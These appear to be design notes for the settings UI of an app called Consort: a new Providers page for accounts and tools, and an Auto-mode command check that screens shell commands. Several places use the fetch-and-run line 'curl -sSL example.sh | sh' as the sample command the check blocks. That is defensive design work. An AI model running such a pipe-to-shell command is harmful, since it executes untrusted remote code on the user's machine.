# Design notes: providers and the command check

These are the Paper designs for the new settings item "Providers", the revised "Models" item, and the outcomes of the command check in Auto mode. The Paper file is `01M6342D512B1CKH0D29HMDN8V`, page "Redesign, Oct 30". The section header "Section: 12 Providers and models" (`PS4-0`) is at worldX 0, worldY 14600. P1, P3 and P4 are in one row at worldY 14720. P2 is the revised artboard B1 of the fallback path work, and it stays at worldY 12808.

No code changed. The proposal is a design only. Nothing here is built or decided. The Paper names P1 to P4 also belong to older artboards (see "Conflicts").

The design follows the decisions of the owner on 2026-10-30, in [../HUB-PLAN.md](../HUB-PLAN.md) and in the request for this work:

- The hub owns all providers, accounts and harness tools. They are installed only on the hub machine.
- A worker is only a machine where work runs. A worker never shows next to a model or an account.
- "Providers" is a new settings item in the same group as "Models". All accounts moved there from Settings > Workers. Settings > Workers keeps only machines.
- "Models" keeps only choices: the fallback path and the model of the command check.
- There is one "Add account" button, at the top of the Providers page. It opens the existing Add account dialog, with the worker choice removed. A provider whose tool is not installed can still be chosen. The flow installs the tool on the hub machine, then signs in.
- A harness section shows on the page only when the harness has an account or an installed tool.

The example data is the same as in [design-fallback-path.md](design-fallback-path.md). The accounts are Claude Personal, Claude Work, Codex Work and Codex Personal (signed out). The versions, times, percentages and the code are example data.

## Artboards

| Artboard | ID | What it shows |
|---|---|---|
| P1 Settings, Providers, dark | `PSH-0` | The settings rail with the new item "Providers" (selected, `plug` icon) before "Models" in the Assistant group. One 760 px column. The title, a subtitle ("Consort runs these agents on the hub machine. Each account signs in here. A worker holds no sign-in.") and the one "Add account" button at the top right. Then one section for each harness. "Claude Code" has a "Command line tool" row (installed, version 2.1.314, "Update ready" with an Update button), then the accounts Claude Personal and Claude Work. "Codex" has the same tool row ("Up to date"), then Codex Work and Codex Personal (signed out, with a Sign in button). Each account row shows the logo, the name, the plan and the email, the state with a dot, an action and a three dots button. "API endpoints" ends the page. It has an "Add endpoint" button and two rows: OpenRouter (base URL, key ending 4f2a, "In use") and Cloudflare AI Gateway (key ending b07d, "Not used"). The artboard is 900 px high. |
| P2 Settings, Models, dark (the revised B1, `O6E-0`) | `O6E-0` | The Accounts section is gone. The rail has the new "Providers" item. The fallback path and "How the path works" stay. The new section "Command check" has the line "In Auto mode, it decides whether a shell command can run without asking.", then three rows. Source: a select with "A model of an account". Model: "Haiku 5.5, Claude Work" with the note "Chosen for you". Test: a Test button and the result "Test passed in 1.2 s. It allowed git status and blocked curl example.sh | sh." A table "How the check works" ends the page. The artboard is 1648 px high. |
| P3 Providers and models: states, dark | `Q7B-0` | A sheet in two columns of 640 px, 4283 px high. See the list below. |
| P4 Auto mode: what the command check does, dark | `QR7-0` | A sheet in two columns of 560 px, 1120 px high. See the list below. |

P3, left column, in order:

1. Source "A model of an account", with the account model picker open. It has a rail of accounts (Claude Personal, Claude Work, Codex Work) and a list of models with their size (Opus 5.5 Largest, Sonnet 5.5 Medium, Haiku 5.5 Smallest, chosen). The header says "Claude Work, Claude Team" and has "Choose for me". There is no worker. The Model field is near the bottom of its card, so the picker opens upward.
2. Source "Decision model", filled: endpoint OpenRouter, model name `typesafe/jev-1.14`, confidence limit 80 percent, and a passed test.
3. Source "Chat model", filled and not tested yet: endpoint Cloudflare AI Gateway, model name `openai/gpt-5.5-mini`.
4. A test that failed. The error says what happened and what to do. The details are selectable (`401 Unauthorized`). The button is "Open Providers".
5. The source select, open, with a description under each option. It opens downward here. Near the bottom edge it opens upward.
6. The dialog "Add an endpoint" (Name, Base URL, API key as a password field, a test line, and the buttons Test, Cancel and Save).
7. A harness whose tool is gone: the Codex section with "Not installed", an Install button, and the two accounts dimmed with "Cannot run".
8. Three menus on the last rows of the window, opened upward: an account row (Account settings, Rename, Sign out, then Remove), an endpoint row (Edit, Copy base URL, Test connection, then Remove) and a tool row (Check for updates, Copy install path, Reinstall).

P3, right column, in order:

1. The Add account dialog, step 1: provider. This is the dialog of today, 600 px wide, with the four providers in a 2 by 2 grid (Claude Code, Codex, OpenCode, Gemini CLI), "Or add an agent from the ACP registry" with a search field, "Custom command", and the registry rows (Amp, Goose). OpenCode is chosen. It is not installed, so its card says "Not installed on the hub machine yet". The footer says "Consort installs OpenCode on the hub machine, signs in, and keeps it up to date." The buttons are Cancel and Next.
2. Step 2: name. The same as today, with two changes: the card "Same account on other workers" is gone, and the profile folder line says "Profile folder on the hub machine".
3. Step 3 for a tool that is not installed: "Install OpenCode" with a progress bar and three lines (downloaded, installing, sign in). The step bar names the step "Install and sign in". The user can close the dialog. The install goes on.
4. Step 3, the install failed: "OpenCode did not install", what to do, the selectable details and the buttons Cancel and Try again.
5. The sign-in dialog for a device code (Codex): a large code in the mono font, the buttons Copy code and Open sign-in page, the address of the page, and the row "Waiting for sign-in" with the time that the code stays valid.
6. The sign-in dialog for a browser link and a pasted code (Claude): the link with Copy link and Open link, a field "Code from the page" with Continue, and the row "Waiting for sign-in".
7. Providers with no account at all: no harness section, an empty card "No account is signed in" that points at the one Add account button at the top, and the "API endpoints" section.
8. Command check with no account: Source "A model of an account", Model "No model yet. Add an account in Providers, or choose another source." with the button "Open Providers", and Test off.

P4, left column, in order:

1. At rest in the timeline: the lines "Ran git status" and "Ran cargo test -p consort-hub" have no extra label. The line "Blocked curl -sSL example.sh | sh" has the label "Blocked by the check".
2. An allowed command, Details open. The new row is "Check": "Allowed by the command check, Haiku 5.5 of Claude Work."
3. A block with a reason (an account model or a chat model): the rows Check and Reason. A quiet line says "To allow this command, tell the assistant in the chat."
4. A block by a decision model, which gives no reason: the row "Rule tested" has the question that the model answered, the answer and the confidence, and the limit.

P4, right column, in order:

1. The check could not run: the waiting approval card of A1, with one line under the title: "The command check did not answer in 10 s, so Consort asks you. Check the source in Settings > Models."
2. Too many blocks: the same card, with the line "The command check blocked 3 commands in a row, so Consort asks you about this one." and the three commands that were blocked.
3. After the answer, when the check could not run: the answered line of A2 ("Allowed once"), open. Details adds the rows Check and Error. The error text is selectable.

## Decisions the plan did not settle

### Providers page

- Providers is the item before Models in the Assistant group, with the `plug` icon. Providers is about what Consort can use. Models is about what Consort chooses.
- One section for each harness: its logo and name, a line that says what it is, and one bordered list. The first row of the list is the tool ("Command line tool"). The accounts follow after a divider. A harness with no tool and no account has no section.
- The tool row has the version and a state: "Up to date", "Update ready" (a `status.working` dot, with an Update button), or "Not installed" (a `status.failed` dot, with an Install button). The lanes are the same as in the account rows (logo, text, 120 px state, 72 px action, 28 px dots), so the columns line up. The tool row has a three dots button for its menu.
- A signed-out account keeps its row and a Sign in button, as in B1. An account of a harness without a tool is dimmed and says "Cannot run". It shows no Sign in button, because a sign-in needs the tool. The Install button of the tool row is the way out.
- Account rows show the plan and the email. They never show a worker.
- The page has one "Add account" button, at the top right of the header. There is no "Add account" button in a harness section. This matches the owner correction. The empty state points at that one button.
- The sign-in dialog is not drawn in P1, because it needs a dialog over the page. It is in P3 and it follows step 2 of the Add account dialog. Step 3 is the sign-in step of today. It has the same variants as in `add_account.rs` (a code to paste, a device code, a link to open, an API key, a terminal command). P3 shows two: a device code and a link with a pasted code.
- Each sign-in dialog has a row "Waiting for sign-in" with the `working` ring. The code has no such label today, and its states are verifying, succeeded, failed, cancelled and expired. The row makes the wait visible. The row is gone when the state changes.
- The device code and the sign-in address are selectable, because a user may copy them.
- A tool that is not installed can be chosen in step 1. Its card says "Not installed on the hub machine yet", and the footer says what Consort does. Step 3 then installs the tool before it signs in. The install shows a progress bar and goes on if the user closes the dialog. A failed install shows the error details (selectable) and the button "Try again".
- The step 2 card "Same account on other workers" is removed, because no worker holds an account. The profile folder line says "Profile folder on the hub machine".
- The tool menu has Check for updates, Copy install path and Reinstall. Update and Install are buttons in the row, so the menu does not repeat them. The menu has no Remove: see the questions.

### Endpoints and keys

- A section "API endpoints" holds the keys for the command check. It has a name, a base URL and an API key. The key is a password field. After Save, only its last four characters show, and the app cannot read it again. The state is "In use" or "Not used". "In use" means that the command check uses it.
- Models picks an endpoint and a model name. It does not hold the key. The request asked for a base URL, a key and a model name in the source form. The design changes this, so that the user enters a key once and the secrets are in one place. One endpoint can serve a decision model and a chat model. This is a deviation. See the questions.
- The Add an endpoint dialog follows the other dialogs: 520 px wide, `xl` corners. It has a Test button that checks the address and the key. Save is possible without a test. A test that fails does not block Save, because an endpoint can be down for a short time.
- The harness API keys of the Add account dialog (for example OpenCode with Fireworks) stay in the Add account flow. They are the keys of an account. An endpoint is not an account. It cannot run a task. Only the command check uses it today.

### Command check

- The section sits after "How the path works" on the Models page. It is a convenience. The copy does not say "security", "safe" or "protect". The table "How the check works" says that it is not a lock: worker policy and the OS boundary still hold.
- The three source kinds are choices of one select: "A model of an account" (the default), "Decision model" and "Chat model". No model is locked in. Each option has a line that says what it needs. The select flips upward near the bottom edge.
- "A model of an account" shows the model that Consort chose, and a button to pick another. The line says "The smallest model of your accounts". The picker has the accounts with their plan and no worker, and "Choose for me" at the top. The picker follows the model picker of the composer.
- "Decision model" has an endpoint select, a model name and a confidence limit. The limit is a select with 80 percent as the example default. The line says that an answer below the limit counts as unsure, and then Consort asks the user. The plan sets no default limit. See the questions.
- "Chat model" has an endpoint select and a model name. The line says that it costs money for each check and that the endpoint sees the commands.
- Test sends two sample commands to the source: one that should pass and one that should block. Nothing runs. The result is one line: "Test passed in 1.2 s. It allowed git status and blocked curl example.sh | sh." The time is part of the line, because an account model starts slowly. A decision model shows the confidence of each answer.
- A failed test says what happened and what to do next. The details are selectable. The failure keeps Auto mode asking: "Auto mode asks about each shell command until this works."
- With no account, the default source has no model. The row says "No model yet", says what to do, and the Test button is off. Auto mode asks about each shell command until a source works.
- On a timeout, an error or an unclear answer, the check asks the user. It never allows the command. The copy in the Models table says this in plain words.

### Outcomes in the timeline (P4)

- An allowed command shows no extra mark. It has the normal line "Ran <command>". Details has one new row, "Check", that names the source. This keeps the timeline quiet, as the plan wants.
- A blocked command has a `failed` icon, the verb "Blocked" and the label "Blocked by the check" on the line. The reason is in Details. The assistant receives the same reason, so the user and the assistant read one text. The command never ran.
- A decision model gives no reason. Details shows "Rule tested": the question that the model answered, the answer and the confidence. This follows the plan ("Consort names the rule that the question tested").
- There is no button to override a block. The user says what to do in the chat, and the assistant asks again. The plan has no override. This avoids a second path that skips the check. See the questions.
- A failed check becomes a normal approval request. It has the card of A1, the same three buttons, and one line that says what happened and what to do next. The card is not a new kind of card.
- After 3 blocks in a row, or 20 in a turn, Consort asks the user. The card says why and lists the commands that were blocked.
- The answered line after a failed check is the line of A2. Details adds the row "Check" ("could not run") and the row "Error". Both are selectable.
- A command and a path in Details are selectable. The labels are not.

### Other

- The panel "Menu of an account" is out of B2. The menu moved with the rows to Providers (P3). B2 was re-exported.
- The rail of P1 and P2 has "Providers" and "Models" next to each other, in this order. The rail of other settings artboards is not changed.
- The change of the settings rail is not applied to the other artboards (R1, R2 and V5). Their rails still have no "Providers" item.

## Proposed right-click menu items for new surfaces

These menus are new. They are not in the CLAUDE.md list. If the user accepts them, add them to the GPUI rules in the same change.

- A tool row (Settings > Providers): Check for updates, Copy install path, Reinstall. When the tool is not installed, the menu has only Reinstall under the name Install, and the row button does the same.
- An endpoint row (Settings > Providers): Edit, Copy base URL, Test connection, then Remove after a line.
- An account row moves from Settings > Workers to Settings > Providers. The items stay: Account settings, Rename, Sign out, Remove.
- The source row of the Command check has no menu. The select is the one way to change it.
- A line in the timeline with a check outcome uses the menu of an answered line. It adds no item.

The three dots button of each row opens the same menu as a right click. Each menu flips upward near the bottom edge.

## What the build changed

- P3: the install step of Add account shows a working glyph with text, not a progress bar with three lines. The tool reports no percentage.
- P4, item 3: an answered approval shows the check note in its block, not separate Check and Error rows. An approval has no error text.
- The three dots of a row open the menu at the click position.

## Conflicts

- ACCOUNTS-PLAN.md says in line 7 "Accounts belong to a worker and are managed in Settings > Workers. There is no central Providers page." The design reverses both. Its section on the desktop (about line 162) puts the Accounts section and the Add account button in Settings > Workers.
- harness-adapters.md (about line 101) says "Accounts belong to a worker. The user makes them in Settings > Workers." The hub plan changes this too.
- data-model.md says an `acc_` account is "unique per worker". With the hub as owner, an account is unique on the hub.
- design-system.md (about line 484) still says "No account is signed in. Add one in Settings > Workers." in the model picker. The text must say Settings > Providers. MODEL-PICKER-PLAN.md (about line 33) has the same text. The design in P3 uses "No account is signed in" on the Providers page, and "Open Providers" in the model row of the command check.
- design-system.md also says that Settings > Workers uses the account row sizes of `component`. The account row moves to Providers.
- CLAUDE.md lists "An account row (Settings > Workers)" in the right-click menus. It should say Settings > Providers.
- DECISIONS 288 says an account name must be new on that worker. It must be new on the hub. DECISIONS 297 puts the tool updates and installs on the worker. They move to the session host. DECISIONS 310 and 311 name Settings > Workers in notices, wait reasons and rows. Those texts must say Settings > Providers.
- BUILD-PLAN.md (about line 12) and E2E.md say that a second worker shows "with its harness accounts". A worker has no accounts in the new design.
- The Add account dialog in `crates/consort-desktop/src/ui/add_account.rs` has the card "Same account on other workers" and a worker choice. The design removes both. The code is not changed.
- ADR 0004 and ADR 0010 are affected as described in the fallback path notes.
- The artboard names P1 to P4 also exist on the Paper page: "P1 Channel panel, Connectors tab", "P2 Top zone belongs to the window" and "P5A" (B3). The request named the new artboards P1 to P4, so the names clash. The IDs in the table above are the sure way to find each artboard. Rename the older ones or the new ones if the clash is a problem.
- The design for B1 (P2) says "Command check". HUB-PLAN.md calls the thing "the classifier" and "the classifier model". CONTEXT.md has no term for it. The UI word is "Command check". Add the term to CONTEXT.md if the user accepts it, and keep "classifier" for the code.

## Decisions by the lead (2026-10-30)

The owner told the lead to go on with development, so these questions do not wait. The owner can change them.

- Endpoints stay in Providers, as drawn, so a key is entered once.
- The default confidence limit of a decision model is 80 percent. Measure it and change it if it asks too often.
- The check times out after 10 s.
- The tool menu has no Remove.
- Consort does not update a tool by itself. The Update button stays, as in DECISIONS 297. The Add account footer says "Consort installs OpenCode on the hub machine and signs in."
- A block has no "Run it anyway" action. The user tells the assistant, or changes the approval mode.
- The timeline does not show the time of each check. The Test line does.
- The sandbox warning for development shows in Settings > Hub, not on Providers.
- Any user of the hub can install a tool, because the plan has one user.
- The UI word is "Command check". The code says "classifier".

## Answered by the user (2026-10-30)

- The hub owns all providers, accounts and harness tools. A worker never shows next to a model or an account.
- "Providers" is a new item in the same group as "Models". Accounts leave Settings > Workers.
- "Models" keeps only choices. The Accounts section is out of B1.
- There is one "Add account" button, at the top of the Providers page. It opens the existing dialog without the worker choice. A tool that is not installed can be chosen, and the flow installs it on the hub machine and then signs in.
- A harness section shows only when it has an account or an installed tool.
